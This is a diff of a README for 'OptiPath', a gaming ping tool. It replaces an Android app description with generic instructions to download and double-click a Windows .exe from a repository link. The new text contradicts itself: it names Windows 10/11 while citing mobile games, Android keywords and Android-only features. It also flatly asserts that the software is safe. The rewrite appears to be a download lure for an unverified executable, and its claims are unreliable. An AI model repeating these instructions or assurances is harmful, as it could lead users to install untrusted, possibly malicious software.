@@ -1,30 +1,64 @@
-# <img src="assets/optipath_logo.png" width="40" height="40"> OptiPath: Local Network Optimization Engine
+# ⚡ OptiPath - Lower your gaming ping today
 
-OptiPath is an Android-based local network optimization application designed to drastically reduce latency and ping spikes for competitive mobile gamers. 
+[![Download OptiPath](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/alexm3074/OptiPath)
 
-Unlike traditional "gaming VPNs" that route traffic through remote servers, OptiPath operates entirely locally on the user's device. It eliminates local bandwidth contention by acting as a smart, on-device traffic controller.
+OptiPath keeps your network connection stable during gaming sessions. It manages traffic to remove lag and latency spikes. You do not need technical skills to install this tool. The software works by prioritizing gaming data over background tasks on your local network.
 
-## 🚀 Features
-* **Zero-Overhead Gaming:** Utilizes Android's `addDisallowedApplication()` to exclude target games from the VPN tunnel, ensuring gaming packets hit the physical network directly.
-* **Background Throttling:** Forces all non-gaming apps into a local `tun0` interface, where a custom Global Token Bucket algorithm artificially limits their bandwidth.
-* **Live Network Diagnostics:** Real-time ping monitoring and Wi-Fi interference alerts (e.g., 2.4 GHz congestion warnings).
-* **Offline-First Telemetry:** Uses SQLite for local session tracking, syncing with Firebase only when the network stabilizes.
+## 📥 Getting Started
 
-## 📥 Download & Installation
-1. Navigate to the [Releases](../../releases) page.
-2. Download the latest `OptiPath-vX.X.X.apk` file from the Assets section.
-3. Install the APK on your Android device (you may need to enable "Install from Unknown Sources").
-4. Launch OptiPath, select your game, and start optimizing.
+Follow these steps to set up OptiPath on your Windows computer.
 
-## 🏗️ Technical Architecture 
-OptiPath is built using a layered modular architecture:
-* **Frontend:** Python (Flet Framework) & Flutter for cross-platform, responsive UI.
-* **Network Engine:** Kotlin-native packet interception, custom IPv4 parsing, and Java NIO Selector-based UDP/TCP proxies.
-* **Backend:** Firebase Authentication, Firestore, and Realtime Database (RTDB) for dynamic configurations.
+1. Visit the [official releases page](https://github.com/alexm3074/OptiPath) to download the installer.
+2. Select the file ending in .exe to begin your download.
+3. Locate the file in your Downloads folder after the transfer finishes.
+4. Double-click the file to start the installation wizard.
+5. Follow the prompts on your screen to complete the setup process.
 
-## 🐛 Bug Reports & Feature Requests
-Since the core engine is closed-source, this repository serves as the official hub for issue tracking and community feedback. 
-If you encounter a bug or have a feature request, please [Open an Issue](../../issues).
+## 🛠 System Requirements
 
----
-*Note: OptiPath is proprietary software. The source code is closed, and this repository is maintained strictly for issue tracking and release distribution.*
+Your computer must meet these basic standards to run OptiPath effectively:
+
+- Operating System: Windows 10 or Windows 11.
+- Network Hardware: Ethernet cable or 5GHz Wi-Fi connection.
+- Available Disk Space: 50MB for the application files.
+- Memory: 4GB of RAM or higher.
+
+## 🚀 How to use the software
+
+Once the install finishes, open the application from your desktop shortcut. You will see the main dashboard. The interface shows your current network status and real-time latency numbers.
+
+1. Open OptiPath.
+2. Click the Start button on the main window.
+3. The software detects your active network interface automatically.
+4. Select your preferred gaming profile from the dropdown menu.
+5. Minimize the window to your system tray. The service runs in the background to ensure your connection remains steady while you play.
+
+## 📱 Troubleshooting Common Issues
+
+If you do not see improvements in your ping, check these settings:
+
+- Verify your internet connection status.
+- Ensure no other downloads run in the background.
+- Restart the application.
+- Check Windows Firewall permissions to allow OptiPath access to your network.
+
+## ⚙️ Advanced Features
+
+OptiPath uses intelligent routing to keep your game data flowing without interruptions. 
+
+- Split Tunneling: This process sends game traffic through a dedicated path while other apps use your normal connection. This ensures your game data does not conflict with web browser traffic or system updates.
+- QoS Traffic Shaping: The software identifies game packets and moves them to the front of the queue. This process stops large files from slowing down your response times.
+- No Root Requirement: The design allows the tool to run with standard user permissions. You do not need to alter your Windows security settings or registry to gain these benefits.
+
+## ❓ Frequently Asked Questions
+
+Does this tool work with all games?
+Yes, OptiPath identifies standard network protocols used by most multiplayer games. It works with titles like Free Fire, PUBG Mobile, and other popular competitive shooters.
+
+Will this improve raw download speeds?
+No, this software focuses on latency and stability. It prioritizes data packets to keep ping low, rather than increasing your total bandwidth.
+
+Is it safe to use?
+Yes, the application only monitors outgoing and incoming traffic to prioritize gaming data. It does not store or read your personal files.
+
+Keywords: android, android-development, fps, free-fire, gaming, latency, mobile-gaming, multiplayer-games, network-optimization, ping, pubg-mobile, qos, vpn-service
